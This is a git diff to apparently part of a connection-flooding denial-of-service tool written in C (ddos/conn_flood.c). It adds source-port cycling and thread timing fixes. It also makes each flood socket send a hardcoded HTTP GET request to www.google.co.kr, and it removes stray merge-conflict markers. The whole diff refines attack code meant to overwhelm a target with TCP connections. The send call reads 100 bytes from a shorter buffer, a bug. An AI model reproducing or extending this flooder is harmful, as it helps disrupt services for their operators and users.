@@ -12,6 +12,7 @@ unsigned int conn_per_second;
 unsigned int conn_duration;
 double conn_elapsed_time;
 
+
 char *conn_dest_ip;
 char *conn_src_ip;
 int conn_src_port;
@@ -23,6 +24,8 @@ short conn_receiver_count;
 short* conn_receiving_flag;
 
 clock_t conn_global_time;
+clock_t conn_global_elapsed_time;
+
 
 pthread_mutex_t conn_mutex = PTHREAD_MUTEX_INITIALIZER;
 pthread_cond_t conn_cond = PTHREAD_COND_INITIALIZER;
@@ -70,6 +73,9 @@ void* generate_conn_flooding1(void *data) {
 		int orig_port = conn_src_port;
 
 		conn_src_port++;
+			if(conn_src_port >= 65000)
+				conn_src_port= 10000;
+
 
 		int waited_duration = ((double) (conn_global_time - thread_clock)) / CLOCKS_PER_SEC;
 			if(waited_duration < __MINIMUM_RESPONSE_WAIT_TIME__)
@@ -225,7 +231,8 @@ void* generate_conn_flooding4(void *data) {
 
 
 		int sock = make_socket(IPPROTO_TCP);
-
+		conn_elapsed_time = ((double) (thread_clock - conn_global_elapsed_time))
+								/ CLOCKS_PER_SEC;
 
 		if (conn_elapsed_time >= conn_duration) {
 			pthread_mutex_unlock(&conn_mutex);
@@ -248,6 +255,9 @@ void* generate_conn_flooding4(void *data) {
 		int orig_port = conn_src_port;
 
 		conn_src_port++;
+		if(conn_src_port >= 65000)
+			conn_src_port= 10000;
+
 		int waited_duration = ((double) (conn_global_time - thread_clock)) / CLOCKS_PER_SEC;
 		if(waited_duration < __MINIMUM_RESPONSE_WAIT_TIME__)
 			pthread_cond_wait(&conn_cond, &conn_mutex);
@@ -261,7 +271,9 @@ void* generate_conn_flooding4(void *data) {
 		conn_total++;
 		conn_generated_count++;
 
-
+		char Request[]
+		 = "GET / HTTP/1.1\r\nHost: www.google.co.kr\r\n\r\n";
+		send(sock,Request,100,0);
 		//conn_dest_port++;
 
 		close(sock);
@@ -274,27 +286,24 @@ void* generate_conn_flooding4(void *data) {
 
 void* conn_time_check(void *data) {
 	int thread_id = *((int*) data);
-	clock_t t1, t2;
+	clock_t t1;
 	t1 = clock();
-	clock_t elapsed_time = clock();
+	conn_global_elapsed_time = clock();
 	double time_taken;
 
 	while (1) {
 		pthread_mutex_lock(&conn_mutex);
 
 		conn_global_time =  clock();
-		conn_elapsed_time = ((double) (conn_global_time - elapsed_time))
+		conn_elapsed_time = ((double) (conn_global_time - conn_global_elapsed_time))
 							/ CLOCKS_PER_SEC;
 		if(conn_timed_finisher==1) return 0;
-		t2 = clock();
-		time_taken = ((double) (t2 - t1)) / CLOCKS_PER_SEC;
+		time_taken = ((double) (conn_global_time - t1)) / CLOCKS_PER_SEC;
 
 		if (time_taken >= 1.0) {
 			conn_produced = 0;
 			t1 = clock();
 			time_taken = 0;
-			conn_elapsed_time = ((double) (t1 - elapsed_time))
-					/ CLOCKS_PER_SEC;
 			pthread_cond_signal(&conn_cond);
 		}
 		pthread_mutex_unlock(&conn_mutex);
@@ -375,10 +384,6 @@ void conn_flood_run(char *argv[], int mode) {
 
 	strcpy(conn_src_ip, argv[0]);
 
-<<<<<<< HEAD:ddos/conn_flood.c
-
-=======
->>>>>>> 51ce004bd89cee0a1e56bf871eddbb8c9c97d454:src/ddos/conn_flood.c
 	conn_produced = 0;
 	if (mode == 1) {
 		conn_total = atoi(argv[3]);
